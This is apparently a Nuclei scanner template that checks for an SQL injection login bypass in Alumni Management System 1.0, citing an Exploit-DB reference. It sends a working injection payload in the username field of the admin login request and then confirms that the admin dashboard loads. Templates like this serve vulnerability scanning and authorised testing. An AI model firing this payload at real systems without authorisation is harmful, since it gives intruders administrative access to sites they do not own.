id: alumni-management-sqli
info:
  author: arafatansari
  description: 'Alumni Management System Admin Login page can be bypassed with a simple
    SQLi to the username parameter.

    '
  name: Alumni Management System 1.0 - SQLi Authentication Bypass
  reference:
  - https://www.exploit-db.com/exploits/48883
  severity: high
  tags: alumni,sqli,auth-bypass,cms
requests:
- cookie-reuse: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - Welcome back Admin!
    - Alumni List
  - negative: true
    part: body
    type: word
    words:
    - '#login-form'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /admin/ajax.php?action=login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin''+or+''1''%3D''1''%23&password=nuclei

    '
  - 'GET /admin/index.php?page=home HTTP/1.1

    Host: {{Hostname}}

    '
